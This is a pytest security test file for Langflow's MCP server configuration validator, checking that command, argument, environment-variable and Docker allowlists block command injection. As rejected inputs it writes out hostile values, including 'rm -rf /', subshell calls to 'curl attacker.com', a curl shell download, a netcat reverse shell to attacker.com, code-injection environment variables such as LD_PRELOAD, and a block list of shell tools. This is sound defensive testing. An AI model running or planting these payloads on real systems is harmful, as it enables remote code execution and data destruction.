"""Security tests for MCP command injection vulnerability (CWE-78).

This test suite validates that the MCP stdio server configuration properly
validates commands against an allowlist to prevent arbitrary command execution.

Vulnerability: Attackers with authenticated access (or unauthenticated via auth
bypass) could add MCP stdio servers with arbitrary commands, achieving Remote
Code Execution (RCE).

Fix: Implement command allowlist, argument, env, and Docker argument validation
in MCPServerConfig schema.
"""

import pytest
from langflow.api.v2.schemas import ALLOWED_MCP_COMMANDS, DANGEROUS_ENV_VARS, MCPServerConfig
from pydantic import ValidationError


class TestMCPCommandInjectionSecurity:
    """Test suite for MCP command injection security fixes."""

    # ==================== Command Validation Tests ====================

    def test_allowed_commands_accepted(self):
        """Test that all allowed commands are accepted."""
        for command in ALLOWED_MCP_COMMANDS:
            config = MCPServerConfig(command=command, args=["--version"])
            assert config.command == command

    def test_allowed_command_with_path_accepted(self):
        """Test that allowed commands with full paths are accepted."""
        # Unix-style path
        config = MCPServerConfig(command="/usr/bin/node", args=["server.js"])
        assert config.command == "/usr/bin/node"

        # Windows-style path
        config = MCPServerConfig(command="C:\\Program Files\\nodejs\\node.exe", args=["server.js"])
        assert config.command == "C:\\Program Files\\nodejs\\node.exe"

    def test_dangerous_command_rejected(self):
        """Test that dangerous commands are rejected."""
        dangerous_commands = [
            "rm",
            "curl",
            "wget",
            "bash",
            "sh",
            "cmd",
            "powershell",
            "nc",
            "netcat",
            "telnet",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValidationError) as exc_info:
                MCPServerConfig(command=cmd, args=["-rf", "/"])

            error_msg = str(exc_info.value)
            assert "not allowed" in error_msg.lower()
            assert cmd in error_msg

    def test_command_with_arguments_in_string_accepted(self):
        """Test that commands with arguments in a single string are accepted (frontend compatibility).

        Frontend tests pass commands like "uvx mcp-server-fetch" as a single string.
        The validation should extract only the base command (uvx) for allowlist checking.
        """
        # This is how the frontend test passes the command
        config = MCPServerConfig(command="uvx mcp-server-fetch", args=None)
        assert config.command == "uvx mcp-server-fetch"

        # Other examples
        config = MCPServerConfig(command="npx @modelcontextprotocol/server-fetch", args=None)
        assert config.command == "npx @modelcontextprotocol/server-fetch"

        config = MCPServerConfig(command="python -m mcp_server", args=None)
        assert config.command == "python -m mcp_server"

    def test_command_injection_via_semicolon_rejected(self):
        """Test that command injection via semicolon is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js; rm -rf /"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_pipe_rejected(self):
        """Test that command injection via pipe is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js | bash"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_ampersand_rejected(self):
        """Test that command injection via ampersand is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js & curl attacker.com"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_backticks_rejected(self):
        """Test that command injection via backticks is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["`curl attacker.com`"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_dollar_sign_rejected(self):
        """Test that command injection via dollar sign is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["$(curl attacker.com)"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_redirect_rejected(self):
        """Test that command injection via redirect is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js > /tmp/pwned"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_newline_rejected(self):
        """Test that command injection via newline is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js\nrm -rf /"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    # ==================== Dangerous Flags Tests ====================

    def test_python_code_execution_flag_rejected(self):
        """Test that Python -c flag is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="python3", args=["-c", "import os"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_python_pip_install_rejected(self):
        """Test that Python pip install is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="python3", args=["-m", "pip", "install", "malicious-pkg"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()
        assert "pip" in error_msg.lower()

    def test_node_eval_flag_rejected(self):
        """Test that Node -e flag is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["-e", "require 'child_process'"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_pip_install_rejected(self):
        """Test that pip install is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="python3", args=["pip", "install", "malicious-package"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_npm_install_rejected(self):
        """Test that npm install is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["npm", "install", "malicious-package"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_eval_keyword_rejected(self):
        """Test that eval keyword is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["eval", "malicious code"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_exec_keyword_rejected(self):
        """Test that exec keyword is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="python3", args=["exec", "malicious code"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    # ==================== Proof of Concept Tests ====================

    def test_poc_touch_command_rejected(self):
        """Test that the PoC 'touch' command from the security advisory is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="touch", args=["/tmp/pwned_langflow"])  # noqa: S108

        error_msg = str(exc_info.value)
        assert "touch" in error_msg
        assert "not allowed" in error_msg.lower()

    def test_poc_rm_command_rejected(self):
        """Test that dangerous 'rm -rf' command is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="rm", args=["-rf", "/"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_poc_curl_reverse_shell_rejected(self):
        """Test that reverse shell via curl is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="curl", args=["attacker.com/shell.sh"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_poc_netcat_reverse_shell_rejected(self):
        """Test that netcat reverse shell is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="nc", args=["-e", "/bin/bash", "attacker.com", "4444"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    # ==================== Legitimate Use Cases ====================

    def test_legitimate_node_mcp_server(self):
        """Test that legitimate Node.js MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="node",
            args=["path/to/mcp-server.js"],
            env={"DEBUG": "true"},
        )
        assert config.command == "node"
        assert config.args == ["path/to/mcp-server.js"]

    def test_legitimate_python_mcp_server(self):
        """Test that legitimate Python MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="python3",
            args=["-m", "mcp_server"],
            env={"MCP_LOG_LEVEL": "debug"},
        )
        assert config.command == "python3"
        assert config.args == ["-m", "mcp_server"]

    def test_legitimate_npx_mcp_server(self):
        """Test that legitimate npx MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="npx",
            args=["@modelcontextprotocol/server-filesystem", "/tmp"],  # noqa: S108
        )
        assert config.command == "npx"
        assert config.args is not None
        assert len(config.args) == 2

    def test_legitimate_uvx_mcp_server(self):
        """Test that legitimate uvx MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="uvx",
            args=["mcp-server-git", "--repository", "/path/to/repo"],
        )
        assert config.command == "uvx"
        assert config.args is not None
        assert len(config.args) == 3

    def test_legitimate_docker_mcp_server(self):
        """Test that legitimate Docker MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="docker",
            args=["run", "-i", "mcp-server-image"],
        )
        assert config.command == "docker"
        assert config.args is not None
        assert config.args[0] == "run"

    # ==================== Edge Cases ====================

    def test_none_command_accepted(self):
        """Test that None command is accepted (for HTTP-based MCP servers)."""
        config = MCPServerConfig(url="https://mcp-server.example.com")
        assert config.command is None
        assert config.url == "https://mcp-server.example.com"

    def test_empty_args_accepted(self):
        """Test that empty args list is accepted."""
        config = MCPServerConfig(command="node", args=[])
        assert config.command == "node"
        assert config.args == []

    def test_none_args_accepted(self):
        """Test that None args is accepted."""
        config = MCPServerConfig(command="node")
        assert config.command == "node"
        assert config.args is None

    def test_safe_special_chars_in_args_accepted(self):
        """Test that safe special characters in args are accepted."""
        config = MCPServerConfig(
            command="node",
            args=["server.js", "--port=8080", "--host=0.0.0.0", "--config=/path/to/config.json"],
        )
        assert config.command == "node"
        assert config.args is not None
        assert len(config.args) == 4

    def test_windows_exe_extension_handled(self):
        """Test that .exe extension on Windows is properly handled."""
        config = MCPServerConfig(command="node.exe", args=["server.js"])
        assert config.command == "node.exe"

        config = MCPServerConfig(command="C:\\nodejs\\node.exe", args=["server.js"])
        assert config.command == "C:\\nodejs\\node.exe"

    # ==================== Error Message Quality ====================

    def test_error_message_includes_allowed_commands(self):
        """Test that error message includes list of allowed commands."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="malicious_command")

        error_msg = str(exc_info.value)
        # Check that error message includes at least some allowed commands
        assert "node" in error_msg.lower() or "python" in error_msg.lower()
        assert "allowed commands" in error_msg.lower()

    def test_error_message_identifies_rejected_command(self):
        """Test that error message identifies the specific rejected command."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="evil_command")

        error_msg = str(exc_info.value)
        assert "evil_command" in error_msg

    def test_error_message_for_shell_metacharacter(self):
        """Test that error message identifies the dangerous metacharacter."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["test; rm -rf /"])

        error_msg = str(exc_info.value)
        assert ";" in error_msg
        assert "dangerous" in error_msg.lower()

    # ==================== Npx/Uvx Auto-Install Prevention ====================

    def test_npx_auto_install_flag_rejected(self):
        """Test that npx -y (auto-install) flag is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="npx", args=["-y", "@malicious/package"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_npx_yes_flag_rejected(self):
        """Test that npx --yes (auto-install) flag is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="npx", args=["--yes", "@malicious/package"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    # ==================== Subshell Metacharacter Tests ====================

    def test_command_injection_via_subshell_parentheses_rejected(self):
        """Test that command injection via subshell parentheses is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["(curl attacker.com)"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    # ==================== Environment Variable Injection Tests ====================

    def test_ld_preload_env_rejected(self):
        """Test that LD_PRELOAD env var is rejected (arbitrary shared object injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js"], env={"LD_PRELOAD": "/tmp/evil.so"})  # noqa: S108

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_node_options_env_rejected(self):
        """Test that NODE_OPTIONS env var is rejected (Node.js code injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"NODE_OPTIONS": "--require /tmp/evil.js"},
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_pythonstartup_env_rejected(self):
        """Test that PYTHONSTARTUP env var is rejected (Python code injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="python3",
                args=["-m", "mcp_server"],
                env={"PYTHONSTARTUP": "/tmp/evil.py"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_pythonpath_env_rejected(self):
        """Test that PYTHONPATH env var is rejected (module shadowing attack)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="python3",
                args=["-m", "mcp_server"],
                env={"PYTHONPATH": "/attacker/modules"},
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_dyld_insert_libraries_env_rejected(self):
        """Test that DYLD_INSERT_LIBRARIES env var is rejected (macOS code injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_path_env_rejected(self):
        """Test that PATH env var is rejected (command resolution hijacking).

        The downstream _connect_to_server() merges user env AFTER setting PATH,
        so a user-supplied PATH overrides which binary bash resolves.
        """
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"PATH": "/tmp/evil:/usr/bin"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_ld_audit_env_rejected(self):
        """Test that LD_AUDIT env var is rejected (shared object injection like LD_PRELOAD)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"LD_AUDIT": "/tmp/evil.so"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_gconv_path_env_rejected(self):
        """Test that GCONV_PATH env var is rejected (glibc iconv module injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"GCONV_PATH": "/tmp/evil"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_home_env_rejected(self):
        """Test that HOME env var is rejected (config directory redirection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"HOME": "/tmp/evil"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_tmpdir_env_rejected(self):
        """Test that TMPDIR env var is rejected (temp directory redirection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"TMPDIR": "/tmp/evil"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_hostaliases_env_rejected(self):
        """Test that HOSTALIASES env var is rejected (DNS manipulation)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"HOSTALIASES": "/tmp/evil_hosts"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_xdg_config_home_env_rejected(self):
        """Test that XDG_CONFIG_HOME env var is rejected (config directory redirection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"XDG_CONFIG_HOME": "/tmp/evil"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_bash_env_rejected(self):
        """Test that BASH_ENV env var is rejected (bash startup script injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"BASH_ENV": "/tmp/evil.sh"},  # noqa: S108
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_ifs_env_rejected(self):
        """Test that IFS env var is rejected (shell word-splitting manipulation).

        Commands are wrapped in bash -c, so IFS affects how bash parses the string.
        """
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js"], env={"IFS": "/"})

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_bash_func_prefix_env_rejected(self):
        """Test that BASH_FUNC_* env vars are rejected (Shellshock-style function injection)."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(
                command="node",
                args=["server.js"],
                env={"BASH_FUNC_myfunc%%": "() { malicious; }"},
            )

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_env_var_check_is_case_insensitive(self):
        """Test that env var blocklist is case-insensitive."""
        for variant in ["LD_PRELOAD", "ld_preload", "Ld_Preload", "LD_preload"]:
            with pytest.raises(ValidationError):
                MCPServerConfig(command="node", args=["server.js"], env={variant: "/tmp/evil.so"})  # noqa: S108

    def test_all_dangerous_env_vars_blocked(self):
        """Test that every entry in DANGEROUS_ENV_VARS is actually blocked."""
        for env_var in DANGEROUS_ENV_VARS:
            with pytest.raises(ValidationError):
                MCPServerConfig(
                    command="node",
                    args=["server.js"],
                    env={env_var.upper(): "malicious_value"},
                )

    def test_safe_env_vars_accepted(self):
        """Test that safe environment variables are accepted."""
        config = MCPServerConfig(
            command="node",
            args=["server.js"],
            env={"DEBUG": "true", "PORT": "8080", "API_KEY": "secret123"},  # pragma: allowlist secret
        )
        assert config.env is not None
        assert config.env["DEBUG"] == "true"

    def test_none_env_accepted(self):
        """Test that None env is accepted."""
        config = MCPServerConfig(command="node", args=["server.js"])
        assert config.env is None

    # ==================== Docker-Specific Security Tests ====================

    def test_docker_privileged_rejected(self):
        """Test that docker --privileged is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="docker", args=["run", "--privileged", "mcp-image"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_docker_net_host_rejected(self):
        """Test that docker --net=host is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="docker", args=["run", "--net=host", "mcp-image"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_docker_network_host_rejected(self):
        """Test that docker --network=host is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="docker", args=["run", "--network=host", "mcp-image"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_docker_pid_host_rejected(self):
        """Test that docker --pid=host is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="docker", args=["run", "--pid=host", "mcp-image"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_docker_cap_add_rejected(self):
        """Test that docker --cap-add is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="docker", args=["run", "--cap-add=SYS_ADMIN", "mcp-image"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_docker_safe_args_accepted(self):
        """Test that safe Docker arguments are accepted."""
        config = MCPServerConfig(
            command="docker",
            args=["run", "--rm", "-i", "mcp-server-image"],
        )
        assert config.command == "docker"
        assert config.args is not None
        assert "--rm" in config.args

    def test_docker_dangerous_args_not_applied_to_other_commands(self):
        """Test that Docker-specific restrictions don't affect other commands."""
        config = MCPServerConfig(
            command="node",
            args=["server.js", "--network=localhost"],
        )
        assert config.args is not None
        assert "--network=localhost" in config.args

    # ==================== Command Case Sensitivity Tests ====================

    def test_uppercase_command_rejected(self):
        """Test that uppercase command variants are rejected (allowlist is case-sensitive)."""
        for cmd in ["NODE", "Node", "PYTHON3", "Python3", "NPX", "DOCKER"]:
            with pytest.raises(ValidationError):
                MCPServerConfig(command=cmd)
